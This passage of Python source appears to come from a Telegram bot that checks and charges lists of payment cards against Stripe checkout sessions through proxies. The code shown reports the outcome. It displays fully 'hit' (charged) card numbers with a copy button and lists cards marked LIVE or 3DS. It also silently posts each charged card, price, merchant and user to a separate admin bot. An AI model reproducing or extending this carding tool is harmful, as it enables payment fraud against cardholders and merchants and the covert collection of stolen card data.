        )
        if checkout_data.get('success_url'):
            response += f"\n🔗 <a href=\"{checkout_data['success_url']}\">Open Success Page</a>"

        # Copy button with card details
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
        copy_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text="📋 Copy Card",
                copy_text=CopyTextButton(text=hit_card)
            )]
        ])

        await processing_msg.edit_text(
            response, parse_mode=ParseMode.HTML,
            disable_web_page_preview=True, reply_markup=copy_kb
        )

        # ━━━ Send admin notification via separate bot ━━━
        try:
            from config import ADMIN_NOTIF_TOKEN, ADMIN_NOTIF_CHAT
            import aiohttp as _aiohttp
            notif_text = (
                f"🔔 <b>HIT CHARGED!</b>\n\n"
                f"💰 <b>{price_str}</b>\n"
                f"🏪 {checkout_data['merchant'] or 'N/A'}\n"
                f"💳 <code>{hit_card}</code>\n"
                f"👤 {req_user}\n"
                f"⏱ {format_time(total_time)}"
            )
            async with _aiohttp.ClientSession() as notif_session:
                await notif_session.post(
                    f"https://api.telegram.org/bot{ADMIN_NOTIF_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_NOTIF_CHAT,
                        "text": notif_text,
                        "parse_mode": "HTML"
                    },
                    timeout=_aiohttp.ClientTimeout(total=5)
                )
            print(f"[DEBUG] Admin notification sent for hit: {hit_card[:15]}...")
        except Exception as e:
            print(f"[DEBUG] Admin notif failed: {str(e)[:50]}")

    else:
        # ━━━ NO HIT — Show compact summary with reason ━━━
        sep = "━━━━━━━━━━━━━━━━━━━━"

        # Determine WHY charging stopped
        session_expired = any(r['status'] == 'SESSION_EXPIRED' for r in results)
        last_result = results[-1] if results else None

        if cancelled:
            header = "𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱 ⛔"
            stop_reason = "Checkout session is no longer active"
        elif session_expired:
            header = "𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 ⏰"
            # Get the actual error message from the expired result
            expired_result = next((r for r in results if r['status'] == 'SESSION_EXPIRED'), None)
            stop_reason = expired_result['response'] if expired_result else "Checkout session has expired"
        elif len(results) >= len(cards):
            header = f"𝗡𝗼 𝗛𝗶𝘁 — {price_str}"
            stop_reason = "All cards processed, no successful charge"
        else:
            header = f"𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 {price_str}"
            stop_reason = "Charging stopped"

        response = (
            f"{sep}\n"
            f"  <b>{header}</b>\n"
            f"{sep}\n\n"
            f"🌐 𝗣𝗿𝗼𝘅𝘆  ➜  {proxy_display}\n"
            f"🏪 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁  ➜  {checkout_data['merchant'] or 'N/A'}\n"
            f"📦 𝗣𝗿𝗼𝗱𝘂𝗰𝘁  ➜  {checkout_data['product'] or 'N/A'}\n"
            f"⚠️ 𝗦𝘁𝗮𝘁𝘂𝘀  ➜  {stop_reason}\n\n"
        )

        # Show LIVE cards if any
        live_cards = [r for r in results if r['status'] == 'LIVE']
        if live_cards:
            for r in live_cards[:5]:
                response += (
                    f"💳 𝗖𝗮𝗿𝗱  ➜  <code>{r['card']}</code>\n"
                    f"📌 𝗦𝘁𝗮𝘁𝘂𝘀  ➜  LIVE ✅\n"
                    f"📝 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲  ➜  {r['response']}\n"
                    f"{CARD_SEPARATOR}\n"
                )
            if len(live_cards) > 5:
                response += f"       ⋯ {len(live_cards) - 5} more LIVE cards ⋯\n\n"

        # Show 3DS cards with detail type
        three_ds_cards = [r for r in results if r['status'] == '3DS']
        if three_ds_cards:
            for r in three_ds_cards[:3]:
                response += (
                    f"💳 𝗖𝗮𝗿𝗱  ➜  <code>{r['card']}</code>\n"
                    f"📌 𝗦𝘁𝗮𝘁𝘂𝘀  ➜  3DS 😡\n"
                    f"📝 𝗗𝗲𝘁𝗮𝗶𝗹  ➜  {r['response']}\n"
                    f"{CARD_SEPARATOR}\n"
                )
            if len(three_ds_cards) > 3:
                response += f"       ⋯ {len(three_ds_cards) - 3} more 3DS cards ⋯\n\n"

        # Summary
        response += f"{sep}\n"
        summary_parts = []
        if live_count > 0:
            summary_parts.append(f"✅ {live_count}")
        summary_parts.append(f"🥲 {declined_count}")
        if captcha_count > 0:
            summary_parts.append(f"🧩 {captcha_count}")
        if three_ds_count > 0:
            summary_parts.append(f"😡 {three_ds_count}")
        if error_count > 0:
            summary_parts.append(f"💀 {error_count}")
        response += "  ".join(summary_parts)
        response += (
            f"\n🧮 {len(results)}/{len(cards)}  ⏱ {format_time(total_time)}\n"
            f"{sep}\n"
            f"👤 {req_user}"
        )

        await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
